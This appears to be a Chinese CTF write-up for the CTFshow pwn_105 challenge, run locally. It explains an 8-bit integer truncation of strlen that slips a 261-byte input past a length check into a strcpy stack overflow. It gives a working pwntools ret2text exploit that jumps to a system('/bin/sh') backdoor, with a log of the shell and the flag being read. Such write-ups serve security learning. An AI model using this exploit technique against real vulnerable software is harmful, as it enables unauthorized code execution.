# CTFshow-pwn_105
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 整数安全（整数溢出 + 栈溢出）
## 解题思路
> 整数溢出 + ret2text

仅开启 NX 保护
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_105
[*] '/home/mrw/CTFshow/pwn_105'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
程序在主函数中读入一个最长可为0x400的字符串，并将其传入漏洞函数 `ctfshow`
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[1024]; // [esp+0h] [ebp-408h] BYREF
  int *p_argc; // [esp+400h] [ebp-8h]

  p_argc = &argc;
  init();
  logo();
  puts("[+] Check your permissions:");
  read(0, buf, 0x400u);
  ctfshow(buf);
  puts("wtf");
  return 0;
}
```
`ctfshow` 中对字符串长度进行限制后使用 `strcpy`  
```c
char *__cdecl ctfshow(char *s)
{
  char dest[8]; // [esp+7h] [ebp-11h] BYREF
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]

  v3 = strlen(s);
  if ( v3 <= 3u || v3 > 8u )
  {
    puts("Authentication failed!");
    exit(-1);
  }
  printf("Authentication successful, Hello %s", s);
  return strcpy(dest, s);
}
```
程序中存在后门函数 `success`  
```c
int success()
{
  return system("/bin/sh");
}
``` 
虽然 `ctfshow` 中限定字符串长度范围为无符号的4~8，但我们可以输入长度为0~1024的字符串，而存储字符串长度的`v3`是一个`unsigned __int8`(8位无符号整数)  
`strlen` 返回类型为 `size_t` （32位无符号整数），会发生高位截断，存储进 `v3` 的值为 `返回值 % 256`，故仅需满足 `4 <= strlen(s) % 256 <= 8`，可取 `strlen(s) = 261`  
retaddr 对应的偏移为 `dest+0x15`，
**exp 如下**  
```python
from pwn import *
p = process('./pwn_105')
p.send((b'a'*0x15+p32(0x0804870e)).ljust(0x105, b'a') + b'\x00')
p.interactive()
```

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_105.py 
[+] Starting local process './pwn_105': pid 16875
[*] Switching to interactive mode
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Integer_Overflow                                        
    * Site  : https://ctf.show/                                       
    * Hint  :                              
    * *************************************                           
[+] Check your permissions:
Authentication successful, Hello aaaaaaaaaaaaaaaaaaaaa\x0e\x87\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$  
$ ls /
bin		   dev	 lib32		    media  run		       swap.img
bin.usr-is-merged  etc	 lib64		    mnt    sbin		       sys
boot		   flag  lib.usr-is-merged  opt    sbin.usr-is-merged  tmp
cdrom		   home  libx32		    proc   snap		       usr
ctfshow_flag	   lib	 lost+found	    root   srv		       var
$ cat ctfshow_flag
flag{success}
```
